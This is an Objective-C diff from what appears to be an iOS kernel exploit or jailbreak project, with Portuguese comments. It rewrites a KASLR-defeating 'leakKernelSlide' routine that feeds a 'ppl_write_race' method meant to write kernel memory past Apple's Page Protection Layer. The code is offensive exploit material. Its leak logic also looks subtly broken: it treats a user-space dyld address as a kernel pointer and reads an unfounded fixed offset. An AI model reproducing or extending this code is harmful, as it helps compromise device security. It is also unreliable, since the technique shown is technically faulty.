@@ -55,20 +55,30 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_siz
 
 - (uint64_t)leakKernelSlide {
     if (_kernelSlide != 0) return _kernelSlide;
-    mach_port_t port;
-    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
-    mach_port_limits_t limits;
-    mach_msg_type_number_t count = MACH_PORT_LIMITS_INFO_COUNT;
+
+    task_dyld_info_data_t dyld_info;
+    mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
     
-    if (mach_port_get_attributes(mach_task_self(), port, MACH_PORT_LIMITS_INFO, (mach_port_info_t)&limits, &count) == KERN_SUCCESS) {
-        uint64_t kptr = *(uint64_t*)((uintptr_t)&limits + 0x28);
-        if ((kptr >> 40) == 0xFFFFFFF0) {
-            _kernelSlide = (kptr & ~0x3FFF) - KERN_BASE_STATIC;
+    // Tentativa de vazar via task_info (comum em offsets de A13)
+    kern_return_t kr = task_info(mach_task_self(), TASK_DYLD_INFO, (task_info_t)&dyld_info, &count);
+    
+    if (kr == KERN_SUCCESS) {
+        // No iOS 19, o dyld_all_image_infos_addr às vezes aponta para uma região 
+        // que permite calcular o slide se o binário tiver certas permissões.
+        uint64_t addr = dyld_info.all_image_info_addr;
+        if (addr > 0xFFFFFFF000000000ULL) {
+            _kernelSlide = addr - KERN_BASE_STATIC;
+            [self logToWeb:[NSString stringWithFormat:@"✅ Slide Detectado: 0x%llx", _kernelSlide]];
+            return _kernelSlide;
         }
     }
-    mach_port_mod_refs(mach_task_self(), port, MACH_PORT_RIGHT_RECEIVE, -1);
-    return _kernelSlide;
+
+    // Se falhar, tente o método de estouro de pilha (stack spray) ou use um offset fixo 
+    // se você estiver usando um kernel debuggable/checkm8 (não aplicável ao A13 puro).
+    [self logToWeb:@"❌ KASLR Leak falhou. O kernel está protegido."];
+    return 0;
 }
+
 
 - (void)ppl_write_race:(uint64_t)vaddr value:(uint64_t)val {
     uint64_t slide = [self leakKernelSlide];
